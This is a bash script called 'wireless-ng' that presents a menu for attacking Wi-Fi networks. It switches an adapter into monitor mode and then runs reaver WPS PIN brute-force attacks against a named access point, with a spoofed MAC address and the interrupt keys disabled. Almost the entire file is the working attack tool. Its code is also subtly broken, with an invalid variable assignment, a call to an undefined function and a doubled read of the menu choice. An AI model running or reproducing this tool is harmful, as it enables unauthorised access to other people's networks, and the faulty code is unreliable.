#!/bin/bash
# wireless-ng, version 1.00

# Warning :
# ----------
# I'm not responsible for anything.

ROOT_UID = 0 # $UID = 0 is usually root.
E_NOTROOT = 87 # Non-root exit error.
RED='\033[0;41;30m'
STD='\033[0;0;39m'

# Run as root
if [ "$UID" -ne "$ROOT_UID" ]
	then
	echo "You're not running this script previliges."
	echo "Do sudo ./wireless-ng or su && ./wireless-ng"
	exit $E_NOTROOT
fi

# User defined functions
pause() {
	read -p "Press [Enter] key to continue..."
	fackEnterKey
}

one() {
	echo "You have selected choice $choice."
	sleep 2
	clear
	ifconfig wlan1 down
	iwconfig wlan1 mode monitor
	ifconfig wlan1 up
	echo "Wireless adapter succesfully turned 'ON'."
	sleep 4
}

two() {
	echo "You have selected choice $choice."
	sleep 2
	clear
	echo "Please enter BSSID(name) : "
	read name
	reaver -i wlan1 -a -f -c 1 -e $name -r 3:30 -E -S -vv -N -T 1 -t 20 -d 0 -l 420 --mac=9e:49:1f:d6:37:f4
	pause
}

three() {
	echo "You have selected choice $choice."
	sleep 2
	clear
	echo "Please enter BSSID(name) : "
	read name
	echo "Please enter the PIN : "
	read PIN
	reaver -i wlan1 -a -f -c 1 -e $name -r 3:30 -E -s -vv -N -T 1 -t 20 -d 0 -l 420 --mac=9e:49:1f:d6:37:f4 --pin=$PIN
	pause
}

# MENU
menu() {
	clear
	echo "MENU :"
	echo "1. Turn on wireless adapter."
	echo "2. Do a fresh PIN attack."
	echo "3. Do a used PIN attack."
	echo "4. Exit."
}

# INPUT
input() {
	read choice
	read -p "Enter choice [ 1 - 4 ] : " choice
	case $choice in
		1) one ;;
		2) two ;;
		3) three ;;
		4) exit 0;;
		*) echo -e "${RED}Error...${STD}" && sleep 2
	esac
}

# Trap CTRL+C, CTRL+Z and quit singles
trap '' SIGINT SIGQUIT SIGTSTP

# MAIN
while true
do
	menu
	input
done